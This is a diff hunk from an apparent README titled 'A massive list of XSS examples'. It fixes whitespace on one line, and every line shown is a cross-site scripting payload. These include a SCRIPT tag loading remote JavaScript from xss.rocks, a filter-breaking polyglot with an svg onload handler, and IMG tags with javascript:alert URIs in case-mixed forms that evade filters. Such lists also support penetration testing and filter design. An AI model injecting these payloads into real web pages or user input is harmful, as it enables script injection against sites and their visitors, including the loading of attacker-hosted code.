@@ -3,7 +3,7 @@ A massive list of XSS examples
 
 
 * <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
-*  javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+* javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
 * <IMG SRC="javascript:alert('XSS');">
 * <IMG SRC=javascript:alert('XSS')>
 * <IMG SRC=JaVaScRiPt:alert('XSS')>
